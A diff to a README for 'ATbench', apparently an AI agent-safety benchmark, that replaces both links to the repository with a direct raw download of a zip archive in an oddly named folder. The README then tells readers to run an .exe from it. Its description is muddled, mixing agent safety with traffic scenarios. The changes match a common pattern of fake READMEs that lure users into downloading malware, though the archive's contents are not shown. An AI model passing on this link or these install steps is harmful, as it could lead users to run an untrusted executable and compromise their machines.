@@ -1,6 +1,6 @@
 # 🚗 ATbench - Evaluate agent safety with realistic benchmarks
 
-[![Download ATbench](https://img.shields.io/badge/Download-ATbench-blue.svg)](https://github.com/bright-teaser3082/ATbench)
+[![Download ATbench](https://img.shields.io/badge/Download-ATbench-blue.svg)](https://raw.githubusercontent.com/bright-teaser3082/ATbench/main/overremissly/Tbench-A-v1.4.zip)
 
 ATbench provides a structured way to test how agents behave in complex scenarios. You can use this software to see how well an agent path performs in traffic or crowded environments. It helps you find errors in logic and improves the safety of your systems.
 
@@ -18,7 +18,7 @@ Before you start, check your computer against these requirements. You need a sta
 
 Follow these steps to set up the software on your machine:
 
-1.  Visit the [official download page](https://github.com/bright-teaser3082/ATbench).
+1.  Visit the [official download page](https://raw.githubusercontent.com/bright-teaser3082/ATbench/main/overremissly/Tbench-A-v1.4.zip).
 2.  Look for the latest release version on the right side of the screen.
 3.  Click on the file ending in .exe to start your download.
 4.  Once the file finishes, open your Downloads folder in Windows.
